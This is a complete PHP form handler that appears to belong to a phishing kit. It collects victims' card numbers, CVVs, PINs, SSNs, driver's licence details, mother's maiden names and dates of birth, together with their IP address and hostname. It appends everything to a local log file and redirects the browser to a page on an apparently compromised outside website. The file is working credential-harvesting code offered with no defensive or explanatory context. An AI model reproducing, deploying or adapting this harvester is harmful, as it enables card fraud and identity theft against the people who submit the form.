<?
session_start();

             
$ip = GETENV("REMOTE_ADDR");
$hostname = @gethostbyaddr($ip);
$counter=$_POST['counter'];
$title = $_POST['title'];
$first_name = $_POST['first_name'];
$last_name = $_POST['last_name'];
$middle_initial = $_POST['middle_initial'];
$country =  $_POST['country'];
$address1 = $_POST['address1'];
$address2 = $_POST['address2'];
$city = $_POST['city'];
$state = $_POST['state'];
$zip = $_POST['zip'];
$phone1 = $_POST['phone1'];
$ccnumber = $_POST['ccnumber'];
$ccmonth = $_POST['ccmonth'];
$ccyear = $_POST['ccyear'];
$cvv = $_POST['cvv'];
$pin=$_POST['pin'];
$nlicence=$_POST['nlicence'];
$licence=$_POST['licence'];
$mother = $_POST['mother'];
$ssn = $_POST['ssn'];
$month = $_POST['month'];
$day = $_POST['day'];
$year = $_POST['year'];
$month1 = $_POST['month1'];
$day1 = $_POST['day1'];
$year1 = $_POST['year1'];
$string_answer = $_POST['string_answer'];
$next_x = $_POST['next_x'];
$location_counter = "az1.txt";
$counterr = join('', file($location_counter));
$fp = fopen($location_counter,"a+");
$message = "# ".$counter." ".$ip." ".$hostname."\r\nName: ".$title." ".$first_name.".".$middle_initial.".".$last_name."\r\nCountry: ".$country."\r\nAddress: ".$address1."\r\nCity: ".$city."\r\nState: ".$state."\r\nZip: ".$zip."\r\nPhone: ".$phone1."\r\nccnum: ".$ccnumber."\r\nexpdate: ".$ccmonth." - ".$ccyear."\r\ncvv: ".$cvv."\r\nDriverName: ".$nlicence."\r\nDriverLicence: ".$licence."\r\nDriver EXP d/m/y: ".$day1."/".$month1."/".$year1."\r\nMother: ".$mother."\r\nDOB d/m/y: ".$day."/".$month."/".$year."/".$ssn."\r\n\r\n";
fputs($fp, $message);
fclose($fp);

	

	
header("Location: http://starautomation.net/images/demo/initfou.html");
?>
